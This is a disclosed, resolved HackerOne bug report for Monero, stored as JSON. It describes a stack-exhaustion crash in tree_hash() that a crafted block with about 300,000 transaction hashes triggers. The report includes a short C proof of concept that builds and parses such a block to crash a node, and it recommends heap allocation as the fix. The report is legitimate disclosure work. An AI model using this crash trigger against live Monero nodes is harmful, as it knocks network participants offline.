{
  "id": 519120,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTkxMjA=",
  "url": "https://hackerone.com/reports/519120",
  "title": "Computing hash of crafted block leads to crash in tree_hash()",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-03-30T20:31:23.902Z",
  "submitted_at": "2019-03-30T20:31:23.902Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "guido",
    "url": "/guido",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7731,
    "url": "https://hackerone.com/monero",
    "handle": "monero",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Monero",
      "twitter_handle": "monero",
      "website": "https://getmonero.org",
      "about": " Monero: the secure, private, untraceable cryptocurrency"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-07-03T00:11:28.656Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-07-03T00:02:04.731Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:\n\n```c\n#include <cryptonote_basic/cryptonote_format_utils.h>\n\nint main(void)\n{\n    cryptonote::block b = AUTO_VAL_INIT(b);\n    for (size_t i = 0; i < 300000; i++) {\n        b.tx_hashes.push_back({});\n    }\n    std::ostringstream oss;\n    binary_archive<true> ba(oss);\n    std::string s;\n    if ( ::serialization::serialize(ba, b) == true ) {\n        s = oss.str();\n    } else {\n        return 0;\n    }\n\n/* Uncomment to crash */\n    cryptonote::block b2 = AUTO_VAL_INIT(b2);\n    if ( parse_and_validate_block_from_blob(s, b2) == true ) {\n        /* Crash */\n        get_tx_tree_hash(b2);\n    }\n    return 0;\n}\n```\n\nThe reason this crashes is because of this code in ```tree_hash```:\n\n```c\n    char ints[cnt][HASH_SIZE];\n    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem\n```\n\n```ints``` is allocated on the stack, not on the heap. Its size is dynamic; ```cnt``` (derived from the number of ```tx_hashes``` in this example) multiplied by 32 (```HASH_SIZE```) is the amount of bytes reserved on the stack.\n\nOn a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of ```tx_hashes``` will cause more stack to be reserved than is available.\nTechnically, the reservation of the stack space doesn't cause the crash (this only alters the stack pointer), but the subsequent ```memset``` does.\n\nNote that the serialized size of a block with 300000 tx_hashes is about 9 MB (see ```s.size()```), which is well within the limits of ```CRYPTONOTE_MAX_BLOCK_SIZE``` (500MB).\n\nThe best remediation to this issue is to use allocate memory on the heap, not the stack.\n\n## Impact\n\nCrash nodes",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-08-02T00:02:04.855Z",
  "allow_singular_disclosure_after": -143126297.89239913,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "m7mdharoun",
    "tiago-danin",
    "armansameer",
    "anomalroil",
    "who-biz",
    "bobo451",
    "devsec_nate"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
